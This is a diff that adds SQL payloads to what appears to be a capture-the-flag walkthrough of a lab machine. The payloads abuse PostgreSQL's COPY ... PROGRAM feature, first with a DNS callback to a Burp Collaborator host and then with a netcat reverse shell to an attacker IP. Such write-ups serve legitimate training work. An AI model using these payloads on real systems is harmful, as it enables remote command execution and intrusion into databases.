@@ -257,11 +257,29 @@ To do it we only need to send three `requests`.
 
 <br />
 
+```sql 
+COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+```
+
+<br />
+
 ![10](../../../assets/images/Jupiter/10.png)
 
 <br />
 
+```sql 
+CREATE TABLE shell(output text);
+```
+
+<br />
+
 3.- Executing the `Reverse Shell`:
+
+<br />
+
+```sql 
+COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 443 >/tmp/f';
+```
 
 <br />
 
